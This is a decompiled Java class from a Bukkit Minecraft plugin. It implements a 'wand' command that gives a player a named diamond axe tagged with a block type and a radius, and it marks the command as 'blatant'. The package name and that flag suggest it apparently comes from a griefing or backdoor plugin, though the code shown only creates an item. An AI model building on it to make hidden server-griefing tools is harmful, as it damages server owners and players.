/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Material
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.ItemStack
 *  org.bukkit.inventory.meta.ItemMeta
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.util.ArrayList;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class WandCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length == 3) {
            Material material;
            try {
                material = Material.valueOf(args[1].toUpperCase());
            }
            catch (IllegalArgumentException e2) {
                p2.sendMessage(Settings.PREFIX("The block " + Settings.RED + args[1] + Settings.WHITE + " was not found!"));
                return;
            }
            int radius;
            try {
                radius = Integer.parseInt(args[2]);
            }
            catch (NumberFormatException ex2) {
                p2.sendMessage(Settings.PREFIX("The radius has to be a number"));
                return;
            }
            ItemStack wandItem = new ItemStack(Material.DIAMOND_AXE, 1);
            ItemMeta wandMeta = wandItem.getItemMeta();
            p2.sendMessage(Settings.PREFIX("You received a " + Settings.RED + material + Settings.WHITE + " wand"));
            wandMeta.setDisplayName(Settings.WHITE + Settings.NAME + " wand: " + Settings.RED + material);
            ArrayList<String> lore = new ArrayList<>();
            lore.add(Settings.WHITE + "Radius: " + Settings.RED + radius);
            wandMeta.setLore(lore);
            wandItem.setItemMeta(wandMeta);
            p2.getInventory().addItem(wandItem);
        } else {
            p2.sendMessage(Settings.USAGE("wand <block> <radius>"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

